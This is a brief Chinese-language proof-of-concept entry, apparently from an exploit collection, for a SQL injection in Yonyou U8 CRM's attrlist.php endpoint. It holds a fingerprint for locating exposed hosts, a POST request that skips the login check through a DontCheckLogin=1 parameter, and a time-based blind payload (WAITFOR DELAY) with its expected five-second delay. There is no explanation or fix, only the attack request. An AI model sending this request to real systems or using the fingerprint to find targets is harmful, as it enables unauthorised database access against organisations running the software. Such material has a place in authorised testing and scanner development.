# 用友-U8-CRM-attrlist存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="/js/tfunction.js"`
- **请求**：`POST /devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1 HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`

**请求体 / payload**
```
obj_type=1';WAITFOR DELAY '0:0:5'--
```
- **预期**：200　|　响应时间>=5